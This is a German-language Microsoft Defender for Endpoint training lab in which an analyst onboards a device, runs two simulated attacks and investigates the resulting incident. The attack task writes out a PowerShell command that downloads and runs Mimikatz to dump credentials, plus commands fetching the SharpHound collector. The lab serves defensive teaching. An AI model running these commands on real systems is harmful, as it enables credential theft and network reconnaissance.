---
lab:
  title: Übung 2 – Entschärfen von Angriffen mit Microsoft Defender for Endpoint
  module: Learning Path 2 - Mitigate threats using Microsoft Defender for Endpoint
---

# Lernpfad 2 – Übung 1 – Übung 2 – Minimieren von Angriffen mit Microsoft Defender for Endpoint

## Labszenario

![Übersicht über Lab.](../Media/SC-200-Lab_Diagrams_Mod2_L1_Ex2_10_19.png)

Sie sind Security Operations Analyst in einem Unternehmen, das Microsoft Defender für Endpunkt implementiert. Ihr Vorgesetzter plant, einige Geräte zu integrieren, um einen Einblick in die erforderlichen Änderungen der Reaktionsverfahren des SecOps-Teams zu erhalten.

Um die Fähigkeiten von Defender for Endpoint zur Abwehr von Angriffen zu testen, führen Sie zwei simulierte Angriffe aus.

>**Hinweis:** Eine **[interaktive Labsimulation](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** ist verfügbar, mit der Sie dieses Lab in Ihrem eigenen Tempo durcharbeiten können. Möglicherweise liegen geringfügige Unterschiede zwischen der interaktiven Simulation und dem gehosteten Lab vor, aber die dargestellten Kernkonzepte und Ideen sind identisch. 


### Aufgabe 1: Überprüfung des Onboarding der Geräte

In dieser Aufgabe bestätigen Sie, dass das Gerät erfolgreich integriert ist und erstellen eine Testwarnung.

1. Wenn Sie noch nicht im Microsoft Defender XDR-Portal in Ihrem Microsoft Edge-Browser sind, navigieren Sie zu https://security.microsoft.com) und melden sich als Administrator*in für Ihren Mandanten an.

1. Wählen Sie im linken Menü unter **Ressourcen** die Option **Geräte** aus. Bitte warten Sie, bis WIN1 auf der Seite „Geräte“ angezeigt wird, bevor Sie fortfahren. Andernfalls müssen Sie diese Aufgabe möglicherweise wiederholen, um die später generierten Warnmeldungen zu sehen.

    >**Hinweis:** Wenn Sie den Onboarding-Prozess abgeschlossen haben und nach einer Stunde keine Geräte in der Liste „Geräte“ angezeigt werden, kann dies auf ein Onboarding- oder Verbindungsproblem hindeuten.

1. Wählen Sie in der linken Menüleiste **Einstellungen** und dann auf der Seite Einstellungen **Endpunkte** aus.

1. Wählen Sie im Abschnitt Geräteverwaltung **Onboarding** und stellen Sie sicher, dass *„Windows 10 und 11“* als Betriebssystem ausgewählt ist. Die Meldung *„Erstes Gerät integriert“* zeigt nun *Abgeschlossen* an.

1. Scrollen Sie nach unten und kopieren Sie im Abschnitt *„2. Erkennungstest durchführen“* das Erkennungstest-Skript, indem Sie die Schaltfläche **Kopieren**auswählen.  

1. Geben Sie in der Windows-Suchleiste den virtuellen Computer WIN1 **CMD** ein und wählen Sie im rechten Fensterbereich **Als Administrator ausführen** für die Eingabeaufforderung aus. 

1. Wenn das Fenster „Benutzerkontensteuerung“ angezeigt wird, wählen Sie **Ja**, um die App auszuführen. 

1. Fügen Sie das Skript ein, indem Sie mit der rechten Maustaste auf die **Administrator: Eingabeaufforderung** klicken und die **Eingabetaste** drücken, um es auszuführen.

    >**Hinweis:** Nach der Ausführung des Skripts schließt sich das Fenster automatisch.

### Aufgabe 2: Simulierte Angriffe

In dieser Aufgabe führen Sie zwei *simulierte* Angriffe mit *PowerShell* auf *WIN1* aus, um die Funktionen von Microsoft Defender for Endpoint zu erkunden.

`Attack 1: Mimikatz - Credential Dumping`

1. Geben Sie auf dem Computer *WIN1* die Zeichenfolge **Command** in die Suchleiste ein, und wählen Sie**Als Administrator ausführen** aus.

1. Kopieren Sie den folgenden Befehl, fügen Sie ihn in das Fenster **Administrator: Eingabeaufforderung** ein, und drücken Sie die **EINGABETASTE**, um ihn auszuführen.

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. Es sollte die Meldung *Zugriff verweigert* und eine Popupnachricht von `Microsoft Defender Antivirus, Windows Security Virus and threats protection` angezeigt werden, dass *Bedrohungen gefunden* wurden.

1. Schließen Sie das Fenster **Administrator: Eingabeaufforderung** durch Eingabe von **exit** und Drücken der **EINGABETASTE**.

`Attack 2: Bloodhound - Collection`

1. Geben Sie auf dem Computer *WIN1* die Zeichenfolge **PowerShell ** in die Suchleiste ein, und wählen Sie **Windows PowerShell** und dann **Als Administrator ausführen** aus.

1. Kopieren Sie die folgenden Befehle, fügen Sie sie in das Fenster **Administrator: Windows PowerShell** ein, und drücken Sie die **EINGABETASTE**, um sie auszuführen.

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**Hinweis:** Es wird empfohlen, die Befehle einzeln zu kopieren, einzufügen und auszuführen. Dazu können Sie *Editor* öffnen und die Befehle in eine temporäre Datei kopieren. Der erste Befehl erstellt einen Ordner namens *ExternalPayloads* in dem Ordner, in dem sich der Ordner *Atomic Red Team* befindet. Der zweite Befehl lädt die Datei *SharpHound.ps1* aus dem GitHub-Repository *BloodHound* herunter und speichert sie im Ordner *ExternalPayloads*.

1. Es sollte eine Popupmeldung von `Windows Security Virus and threats protection` angezeigt werden, dass *Bedrohungen gefunden* wurden.

1. Kopieren Sie den folgenden Befehl, fügen Sie ihn in das Fenster **Administrator: Windows PowerShell** ein, und drücken Sie die **EINGABETASTE**, um sie auszuführen.

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. Wenn die Ausgabe *True* lautet, wurde die Datei mit den Schadsoftwarenutzdaten von Microsoft Defender Antivirus nicht entfernt. Wenn die Ausgabe *False* lautet, wurde die Datei mit den Schadsoftwarenutzdaten von Microsoft Defender Antivirus entfernt. Verwenden Sie die NACH-OBEN-TASTE, um den Befehl zu wiederholen, bis die Ausgabe *False* lautet.

<!---1. From the left menu, under **Endpoints**, select **Evaluation & tutorials** and then select **Tutorials & simulations** from the left side.

1. Select the **Tutorials** tab.

1. Under *Automated investigation (backdoor)* you will see a message describing the scenario. Below this paragraph, click **Read the walkthrough**. A new browser tab opens which includes instructions to perform the simulation.

1. In the new browser tab, locate the section named **Run the simulation** (page 5, starting at step 2) and follow the steps to run the attack. **Hint:** The simulation file *RS4_WinATP-Intro-Invoice.docm* can be found back in portal, just below the **Read the walkthrough** you selected in the previous step by selecting the **Get simulation file** button. 

1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->

### Aufgabe 3: Untersuchung der Angriffe

1. Wählen Sie im Microsoft Defender XDR-Portal auf der linken Menüleiste **Incidents und Warnungen** und dann **Incidents** aus.

1. Im rechten Bereich wird ein neuer Incident angezeigt mit der Meldung, dass auf einem Endpunkt mehrere Bedrohungsfamilien erkannt wurden. Wählen Sie den Namen des Vorfalls, um seine Details zu laden.

    >**Hinweis:** Im Bereich **Warnungen** sollten Warnungen von *Bloodhound* und *Mimikatz* angezeigt werden. Unter **Ressourcen/Geräte** hat der Computer *win1* jetzt die **Risikostufe** *Hoch*.

1. Wählen Sie die Schaltfläche **Vorfall verwalten** aus und ein neues Fenster wird geöffnet. 

1. Geben Sie unter **Incidenttags** die Zeichenfolge „Simulation“ ein, und wählen Sie **Simulation (Neu erstellen)** aus, um ein neues Tag zu erstellen. 

1. Wählen Sie die Schaltfläche **Zuweisen an**  und fügen Sie Ihr Benutzerkonto (Ich) als Besitzer des Vorfalls hinzu. 

1. Erweitern Sie unter **Klassifizierung**das Dropdownmenü. 

1. Wählen Sie unter **Information, erwartete Aktivität** **Sicherheitstests** aus. 

1. Fügen Sie bei Bedarf Kommentare hinzu und wählen Sie **Speichern**, um das Ereignis zu aktualisieren und zu schließen.

1. Überprüfen Sie den Inhalt der Registerkarten *Angriffshistorie, Alarme, Ressourcen, Untersuchungen, Beweise und Reaktion* und *Zusammenfassung*. Geräte und Benutzer befinden sich unter der Registerkarte *Ressourcen*. Die Registerkarte *Angriffshistorie* zeigt das *Vorfallsdiagramm*. Der **Hinweis:** Einige Registerkarten können aufgrund der Größe Ihres Bildschirms ausgeblendet sein. Wählen Sie die Registerkarte Auslassungspunkte (…), um sie anzuzeigen.

    >**Warnung:** Die hier gezeigten simulierten Angriffe sind eine hervorragende praktische Lernquelle. Führen Sie die Angriffe aus den Anweisungen für diese Übung nur aus, wenn Sie den für den Kurs bereitgestellten Azure-Mandanten verwenden.  Sie können andere simulierte Angriffe für diesen Mandanten durchführen, *nachdem* dieser Schulungskurs abgeschlossen wurde.

## Damit haben Sie das Lab beendet.
